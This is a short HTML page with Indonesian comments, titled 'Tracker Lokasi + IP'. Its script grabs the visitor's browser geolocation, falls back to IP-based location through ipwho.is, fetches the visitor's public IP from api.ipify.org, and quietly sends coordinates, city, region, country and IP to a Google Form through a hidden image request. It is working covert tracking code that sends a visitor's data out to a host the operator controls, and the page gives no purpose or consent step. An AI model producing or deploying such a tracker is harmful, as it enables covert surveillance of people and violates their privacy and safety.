<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <title>Tracker Lokasi + IP</title>
</head>
<body>
  <h2>Sedang merekam lokasiâ€¦</h2>
  <script>
    const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
    const F = {
      lat:  'entry.336954328',   // Latitude
      long: 'entry.122334606',   // Longitude
      acc:  'entry.1466949585',  // Accuracy
      city: 'entry.1958665783',  // City
      reg:  'entry.1713030934',  // Region
      id:   'entry.2142024660',  // Country/ID
      ip:   'entry.1095561107'   // IP
    };

    function submit(params) {
      new Image().src = FORM_URL + '?' + new URLSearchParams(params);
    }

    function sendAll(lat, lon, acc, city, reg, country, ip) {
      const p = {
        [F.lat]:  lat,
        [F.long]: lon,
        [F.acc]:  acc,
        [F.ip]:   ip
      };
      if (city     !== undefined) p[F.city] = city;
      if (reg      !== undefined) p[F.reg]  = reg;
      if (country  !== undefined) p[F.id]   = country;
      submit(p);
    }

    function onGeoSuccess(pos) {
      const { latitude, longitude, accuracy } = pos.coords;
      // ambil IP via api.ipify.org (CORS OK)
      fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => sendAll(
          latitude, longitude, accuracy,
          undefined, undefined, undefined,
          d.ip
        ))
        .catch(() => sendAll(
          latitude, longitude, accuracy,
          undefined, undefined, undefined,
          'unknown'
        ));
    }

    function onGeoError() {
      // fallback: ipwho.is untuk IP + lokasi aproksimasi
      fetch('https://ipwho.is/json/')
        .then(r => r.json())
        .then(d => sendAll(
          d.latitude, d.longitude, 'IP',
          d.city, d.region, d.country,
          d.ip
        ))
        .catch(() => {
          // jika semua gagal, kirim minimal IP
          fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => submit({ [F.ip]: d.ip }))
            .catch(() => submit({ [F.ip]: 'unknown' }));
        });
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        onGeoSuccess,
        onGeoError,
        { timeout: 8000 }
      );
    } else {
      onGeoError();
    }
  </script>
</body>
</html>
